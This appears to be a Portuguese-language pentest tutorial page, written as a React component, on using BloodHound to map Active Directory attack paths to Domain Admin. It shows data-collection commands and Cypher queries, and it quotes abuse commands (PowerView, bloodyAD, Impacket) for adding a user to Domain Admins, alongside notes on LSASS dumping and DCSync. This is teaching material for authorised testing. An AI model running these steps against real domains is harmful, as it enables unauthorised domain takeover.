import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { OutputBlock } from "@/components/ui/OutputBlock";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function BloodHound() {
  return (
    <PageContainer
      title="BloodHound — mapeamento de Active Directory"
      subtitle="Visualiza relacionamentos no AD: usuários, grupos, sessões, ACLs, GPOs — e calcula caminhos para Domain Admin."
      difficulty="intermediário"
      timeToRead="16 min"
      prompt="ad/bloodhound"
    >
      <h2>O que faz</h2>
      <p>
        Em uma AD com 5000 usuários e 200 grupos, descobrir quem pode chegar em "Domain Admin" é
        impossível na mão. <strong>BloodHound</strong> coleta tudo via LDAP/SMB, monta um grafo Neo4j
        e responde queries como <em>"qual o caminho mais curto do usuário X até DA?"</em>.
      </p>

      <h2>Setup — BloodHound CE 5.x</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo apt install -y bloodhound.py neo4j",
            out: "(bloodhound.py = ingestor; neo4j = banco do grafo)",
            outType: "muted",
          },
          {
            comment: "BloodHound CE roda em Docker — mais fácil",
            cmd: "curl -L https://ghst.ly/getbhce > docker-compose.yml && docker compose up -d",
            out: `[+] Running 4/4
 ✔ Container bloodhound-app-postgres-1   Started
 ✔ Container bloodhound-app-graph-db-1   Started
 ✔ Container bloodhound-app-bloodhound-1 Started

✓ BloodHound is running at http://localhost:8080
✓ Initial password printed in container logs`,
            outType: "success",
          },
          {
            cmd: "docker compose logs bloodhound | grep -i 'initial password'",
            out: `bloodhound-app-bloodhound-1  | INFO[0001] Initial Password Set To:    randomly-generated-password-here-92872`,
            outType: "info",
          },
        ]}
      />

      <h2>Coleta — bloodhound.py (Linux remoto)</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "do Kali, contra um DC, com credencial válida",
            cmd: `bloodhound-python -d acme.local -u wallyson -p 'Senha@123' -ns 192.168.50.5 -c All --zip`,
            out: `INFO: Found AD domain: acme.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.acme.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 142 computers
INFO: Connecting to LDAP server: dc01.acme.local
INFO: Found 412 users
INFO: Found 87 groups
INFO: Found 24 gpos
INFO: Found 18 ous
INFO: Found 8 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: srv-fileshare01.acme.local
INFO: Querying computer: srv-iis01.acme.local
INFO: Querying computer: srv-mssql01.acme.local
[...]
INFO: Done in 04M 12S
INFO: Compressing output into 20260403164218_bloodhound.zip`,
            outType: "success",
          },
          {
            cmd: "ls *.zip",
            out: "20260403164218_bloodhound.zip",
            outType: "info",
          },
        ]}
      />

      <CommandTable
        title="Métodos de coleta (-c)"
        variations={[
          { cmd: "All", desc: "Tudo (recomendado em pentest com tempo).", output: "DCOnly + LocalGroup + Session + LoggedOn + Trusts + ACL + Container + ObjectProps + GPOLocalGroup + SPNTargets" },
          { cmd: "DCOnly", desc: "Só dados do DC via LDAP.", output: "Mais furtivo. Sem sessions/local groups." },
          { cmd: "Group", desc: "Membership de grupos.", output: "Quem está em quê." },
          { cmd: "LocalGroup", desc: "Grupos locais nos servidores (precisa SMB).", output: "Quem é admin local." },
          { cmd: "Session", desc: "Sessions ativas em cada workstation/server.", output: "Para sequestrar ou alvo de derivative admin." },
          { cmd: "LoggedOn", desc: "Quem está logado (precisa admin local).", output: "Mais preciso que Session." },
          { cmd: "ACL", desc: "DACLs de objetos AD (delegation, GenericAll).", output: "Onde estão os abuses sutis." },
          { cmd: "ObjectProps", desc: "Properties dos objetos (Description, e-mail, lastlogon).", output: "Pra hunting de senhas no Description." },
          { cmd: "Trusts", desc: "Domain trusts (cross-forest).", output: "Para escalar para outro domínio." },
          { cmd: "SPNTargets", desc: "Conta com SPN (alvo de Kerberoasting).", output: "Veja página dedicada." },
          { cmd: "GPOLocalGroup", desc: "GPOs que escrevem em grupos locais.", output: "Privesc indireta." },
          { cmd: "Container", desc: "Estrutura de OUs.", output: "Hierarquia." },
        ]}
      />

      <h2>Coleta — SharpHound (Windows)</h2>
      <Terminal
        user="user"
        host="WIN"
        path="C:\\Temp"
        prompt=">"
        lines={[
          {
            cmd: "powershell -ep bypass -c \". .\\SharpHound.ps1; Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\\Temp -ZipFileName loot.zip\"",
            out: `Initializing SharpHound at 4:42 PM on 4/3/2026

Resolved Collection Methods: Group, LocalAdmin, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote

[+] Creating Schema map for domain ACME.LOCAL using path CN=Schema,CN=Configuration,DC=acme,DC=local
[+] Cache File Found! Loaded 18421 Objects in cache

[+] Pre-populating Domain Controller SIDS
Status: 0 objects finished (+0 0)/s -- Using 87 MB RAM
Status: 12012 objects finished (+1217 1217)/s -- Using 142 MB RAM
Status: 18421 objects finished (+982 1097)/s -- Using 178 MB RAM

[+] Finished collection!
[+] Output: C:\\Temp\\loot.zip`,
            outType: "success",
          },
          {
            cmd: ".\\SharpHound.exe -c all --zipfilename loot.zip",
            out: "(versão compilada — não precisa de PowerShell)",
            outType: "default",
          },
        ]}
      />

      <h2>Importar e explorar</h2>
      <p>
        Acesse <code>http://localhost:8080</code>, faça login com a senha inicial,
        e em <strong>File Ingest</strong> arraste o ZIP. O ingest leva 1-5 minutos.
      </p>

      <h2>Queries pré-definidas (Pre-Built Analysis)</h2>
      <CommandTable
        title="Queries que TODO pentest deve rodar"
        variations={[
          { cmd: "Find all Domain Admins", desc: "Lista os usuários no grupo Domain Admins.", output: "Alvos de alta valor." },
          { cmd: "Find Shortest Paths to Domain Admins", desc: "Caminho mais curto de qualquer node → DA.", output: "Onde focar primeiro." },
          { cmd: "Find Shortest Paths from Owned Users to DAs", desc: "A partir das contas que VOCÊ comprometeu.", output: "Mostra o próximo passo." },
          { cmd: "Find Computers where Domain Users are Local Admin", desc: "Misconfig comum — Domain Users em Administrators local.", output: "Privesc trivial." },
          { cmd: "Find AS-REP Roastable Users", desc: "Contas com 'Do not require Kerberos preauth'.", output: "Quebra offline. Veja Kerberoasting." },
          { cmd: "Find Kerberoastable Users", desc: "Contas com SPN definido.", output: "Pede TGS, cracka offline." },
          { cmd: "Find Computers with Unconstrained Delegation", desc: "Servers que podem impersonar QUALQUER usuário que logue.", output: "Vetor crítico." },
          { cmd: "Find Computers with Constrained Delegation", desc: "Delegation só para serviços específicos.", output: "Ainda explorável." },
          { cmd: "Map Domain Trusts", desc: "Cross-forest paths.", output: "Para escalar entre domínios." },
          { cmd: "Find Workstations where Domain Users can RDP", desc: "RDP exposto para Domain Users.", output: "Pivot lateral." },
        ]}
      />

      <OutputBlock label="exemplo de saída — Shortest Path to Domain Admin" type="warning">
{`     ┌─ 99 wallyson@acme.local ─┐
     │                            │
     ▼  MemberOf                  │
     ┌─ Group: ITSupport ─┐      │
     │                     │      │
     ▼  AdminTo            │      │
     ┌─ srv-fileshare01 ──┐│      │
     │  (executa como)    ││      │
     ▼  HasSession        ││      │
     ┌─ ana@acme.local  ──┘│      │
     │                     │      │
     ▼  CanRDP             │      │
     ┌─ srv-mssql01.acme  ┐│      │
     │  (executa como)    ││      │
     ▼  HasSession        ││      │
     ┌─ admin-mssql ─────┐│ │      │
     │                    ││ │      │
     ▼  MemberOf          ││ │      │
     ┌─ Group: Domain Admins ────► PWNED!`}
      </OutputBlock>

      <h2>Cypher queries customizadas</h2>
      <CodeBlock
        language="cypher"
        title="queries que valem ouro — cole na barra do BloodHound"
        code={`// Quem TEM Kerberoasting roastable?
MATCH (u:User {hasspn:true}) RETURN u.name, u.serviceprincipalnames

// Contas inativas que ainda têm acesso (>90 dias)
MATCH (u:User) WHERE u.lastlogon < (datetime().epochseconds - 7776000) AND u.enabled=true 
RETURN u.name, u.lastlogontimestamp ORDER BY u.lastlogontimestamp ASC

// Usuários com senha em Description (campo público!)
MATCH (u:User) WHERE u.description =~ '(?i).*password.*' OR u.description =~ '(?i).*senha.*'
RETURN u.name, u.description

// Computers SEM patches recentes (lastlogon antigo do computer object)
MATCH (c:Computer) WHERE c.lastlogon < (datetime().epochseconds - 2592000)
RETURN c.name, c.operatingsystem, c.lastlogon

// Quem ESCREVE GPO Default Domain Policy?
MATCH p=(u)-[r:GenericAll|GenericWrite|WriteOwner|WriteDacl]->(g:GPO {name:'DEFAULT DOMAIN POLICY@ACME.LOCAL'}) RETURN p

// Achar todos os caminhos para DA passando por owned nodes
MATCH p=shortestPath((u {owned:true})-[*1..]->(g:Group {name:'DOMAIN ADMINS@ACME.LOCAL'})) RETURN p

// Domain Users membro de Administrators em alguma máquina
MATCH p=(g:Group {name:'DOMAIN USERS@ACME.LOCAL'})-[:AdminTo]->(c:Computer) RETURN p`}
      />

      <h2>Marcar nodes como "Owned"</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "no GUI: clique no node → Mark as Owned (passa a ser laranja)",
            cmd: "(GUI) right-click 'wallyson@acme.local' → Mark as Owned",
            out: "(node fica laranja. agora 'Shortest Path from Owned' encontra paths a partir dele)",
            outType: "info",
          },
          {
            comment: "ou via Cypher",
            cmd: `MATCH (u:User {name: 'WALLYSON@ACME.LOCAL'}) SET u.owned = true RETURN u`,
            out: "Updated 1 nodes",
            outType: "default",
          },
        ]}
      />

      <h2>Edges (relacionamentos) — abusos</h2>
      <CommandTable
        title="Edges abusáveis (não exaustivo)"
        variations={[
          { cmd: "MemberOf", desc: "User pertence a grupo.", output: "Não é abuse, é fato." },
          { cmd: "AdminTo", desc: "User é admin local em Computer.", output: "Logue e dump LSASS." },
          { cmd: "HasSession", desc: "User tem sessão ativa em Computer.", output: "Roube token, kerberos, NTLM." },
          { cmd: "GenericAll", desc: "Total controle sobre o objeto.", output: "Reseta password, adiciona ao grupo, etc." },
          { cmd: "GenericWrite", desc: "Pode escrever ANY attribute.", output: "Logon Script, SPN, etc." },
          { cmd: "WriteDacl", desc: "Pode mudar permissões do objeto.", output: "Auto-conceder GenericAll." },
          { cmd: "WriteOwner", desc: "Pode tomar ownership.", output: "Vira owner → tem GenericAll." },
          { cmd: "AddMember", desc: "Pode adicionar member ao grupo.", output: "Auto-adicionar a Domain Admins." },
          { cmd: "ForceChangePassword", desc: "Pode trocar password sem saber a antiga.", output: "Reseta admin." },
          { cmd: "ReadLAPSPassword", desc: "Pode ler LAPS password de Computer.", output: "Vira admin local imediato." },
          { cmd: "GPLink", desc: "GPO está linked a OU.", output: "Modificar GPO afeta tudo dentro." },
          { cmd: "AllowedToDelegate", desc: "Constrained delegation.", output: "Vetor de S4U2Self/Proxy." },
          { cmd: "AllowedToAct", desc: "Resource-based constrained delegation (RBCD).", output: "Mais flexível para atacante." },
          { cmd: "DCSync", desc: "Pode replicar diretório (Replication-Get-Changes).", output: "Dump de TODOS os hashes do domínio." },
        ]}
      />

      <h2>Análise de abuse — botão direito em Edge</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "BloodHound mostra TUTORIAL de como abusar de cada edge",
            cmd: "(GUI) clique em 'GenericAll' edge → 'Help'",
            out: `=== GenericAll Abuse ===

This edge means user has GenericAll over target.

Abuse with PowerView:
  Add-DomainObjectAcl -TargetIdentity 'Domain Admins' -PrincipalIdentity 'wallyson' -Rights All

Abuse with bloodyAD:
  bloodyAD --host dc01 -d acme.local -u wallyson -p 'Senha@123' \\
    add groupMember 'Domain Admins' wallyson

Abuse with Impacket:
  python3 dacledit.py -action 'write' -rights 'FullControl' \\
    -principal wallyson -target-dn 'CN=...' acme.local/wallyson:'Senha@123'`,
            outType: "warning",
          },
        ]}
      />

      <PracticeBox
        title="Lab AD com BloodHound"
        goal="Subir um ambiente AD vulnerável (GOAD ou Azure Lab) e mapear caminhos para DA."
        steps={[
          "Suba GOAD (Game of Active Directory) ou similar.",
          "Configure conta de pentest com credenciais válidas.",
          "Rode bloodhound-python -c All.",
          "Importe no BloodHound CE.",
          "Marque sua conta como Owned.",
          "Rode 'Shortest Path from Owned to Domain Admins'.",
          "Documente cada hop.",
        ]}
        command={`# Exemplo com GOAD
git clone https://github.com/Orange-Cyberdefense/GOAD.git
cd GOAD && ./scripts/start.sh   # ~30 min

# Coleta
bloodhound-python -d sevenkingdoms.local -u khal.drogo -p 'horse' \\
  -ns 192.168.56.10 -c All --zip

# Inicie BloodHound CE
docker compose up -d
firefox http://localhost:8080 &

# Drag & drop o ZIP em File Ingest
# Cypher: MATCH (u:User {name:'KHAL.DROGO@SEVENKINGDOMS.LOCAL'}) SET u.owned=true RETURN u
# Pre-built Analysis → Shortest Path from Owned to Domain Admins`}
        expected={`(grafo mostrando)
khal.drogo → MemberOf → DOTHRAKI 
DOTHRAKI → AdminTo → SRV-WIN10 
SRV-WIN10 → HasSession → daenerys.targaryen 
daenerys.targaryen → GenericAll → Domain Admins
                                     ↓
                                  PWNED!`}
        verify="O grafo deve mostrar pelo menos 1 caminho com 3-5 hops até Domain Admins. Cada hop é um abuse acionável."
      />

      <AlertBox type="info" title="BloodHound mudou pentest de AD">
        Antes do BloodHound (2016), explorar AD era manual e demorado. Hoje é
        praticamente impossível fazer pentest sério de AD sem ele. Ferramenta
        equivalente para defesa: <strong>PingCastle</strong>, <strong>Purple Knight</strong>.
      </AlertBox>
    </PageContainer>
  );
}
